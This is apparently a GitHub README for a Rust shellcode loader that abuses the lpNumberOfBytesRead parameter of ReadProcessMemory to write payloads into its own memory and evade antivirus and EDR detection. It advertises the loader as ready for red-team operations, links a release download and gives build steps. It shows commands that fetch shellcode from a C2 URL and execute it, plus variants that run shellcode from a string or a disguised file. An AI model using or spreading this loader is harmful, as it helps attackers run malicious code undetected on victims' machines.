# Indirect-Shellcode-Executor

## Description

Indirect-Shellcode-Executor expoits the miss-configuration/vulnerability present on the API Windows method *ReadProcessMemory* discovered by *DarkCoderSc*.

It exploits the nature of the in/out pointer param named **lpNumberOfBytesRead*, that enables to write into process memory without calling common API methods to do so such as memcpy, this is perfect for AV and EDR detection evasion

```C++
BOOL ReadProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPCVOID lpBaseAddress,
  [out] LPVOID  lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesRead      <----------------------------- Vulnerable param
);
```

This is my own implementation written y RUST, with the difference that this is a fully developed tool, that can directly be used on red team operations as a POC.

## Download

Just go the release section of the repo and download the latest version

```
https://github.com/mimorep/Indirect-Shellcode-Executor/releases
```

## Usage

The main options of the program are the next:

```Powershell
C:\Users\M7>.\indirect_shellcode.exe --help

Rust base program that indirect writes payload into self memory of the process in order to evade detection

Usage: indirect_shellcode.exe [OPTIONS]

Options:
  -s, --string_inyect <STRING_INYECT>
  -f, --file_path <FILE_PATH>
  -t, --remote_payload <TARGET_PAYLOAD>
  -v, --verbose
  -e, --execute
  -h, --help                             Print help
  -V, --version                          Print version
```

There are three possible surfaces for attack scenarios (at least):

### Remote shellcode in-memory inyection & execution

For this case run the program with the next arguments (use -v or --verbose if you want to see the output):

```Powershell
C:\Users\M7>.\indirect_shellcode.exe -t "https://yourownc2.es/shellcode.png" -e -v
```

### In terminal line shellcode inyection & execution

For this case run the program with the next arguments (use -v or --verbose if you want to see the output):

```Powershell
C:\Users\M7>.\indirect_shellcode.exe -s "The string/bin/shellcode text you wan to inyect" -v
```

### From external file shellcode inyection & execution

For this case run the program with the next arguments (use -v or --verbose if you want to see the output):

```Powershell
C:\Users\M7>.\indirect_shellcode.exe -f "C:\Users\Public\Download\shellcode.docx" -e -v
```

## Compile your self

Note that the final binary is in fact a x32 bits, so if you want to compile the binary yourself just run the next command with cargo:

To add support for the x32 compilation:

```Powershell
rustup target add i686-pc-windows-msvc
```

To compile the binary:

```Powershell
cargo build --target i686-pc-windows-msvc --release
```

### Credits

Big kudos to Jean-Pierre LESUEUR (DarkCoderSc) for discovering the pointer vulnerability and posting it to the unprotect.it project, you can contact him here:

https://unprotect.it/users/public/profile/darkcodersc/